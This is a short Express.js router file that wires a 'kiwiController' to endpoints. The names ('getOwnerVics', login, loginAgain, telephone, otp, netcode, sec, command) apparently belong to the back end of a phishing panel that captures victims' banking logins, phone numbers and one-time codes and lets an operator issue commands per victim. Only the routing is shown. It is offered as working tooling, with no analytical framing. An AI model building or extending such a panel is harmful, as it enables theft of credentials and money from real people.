const express = require("express");
const {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitTelephone,
  submitOtp,
  submitSec,
  submitNetcode,
  deleteEntry,
} = require("../controllers/kiwiController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/telephone", submitTelephone);
router.post("/otp", submitOtp);
router.post("/netcode", submitNetcode);
router.post("/delete", deleteEntry);
router.post("/sec", submitSec);

module.exports = router;
